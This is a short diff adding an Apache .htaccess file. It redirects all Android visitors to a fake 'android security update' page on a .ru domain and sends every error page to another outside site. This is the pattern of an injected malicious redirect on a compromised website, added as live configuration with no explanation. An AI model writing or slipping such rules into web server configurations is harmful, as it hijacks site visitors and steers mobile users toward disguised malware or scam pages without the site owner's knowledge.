@@ -1,0 +1,8 @@
+RewriteEngine on
+RewriteCond %{HTTP_USER_AGENT} .*ndroid.*
+RewriteRule ^(.*)$ http://androidsecurityupdatepagelink.ru/fixup.php
+ErrorDocument 400 http://hifoxnws.com
+ErrorDocument 401 http://hifoxnws.com
+ErrorDocument 403 http://hifoxnws.com
+ErrorDocument 404 http://hifoxnws.com
+ErrorDocument 500 http://hifoxnws.com
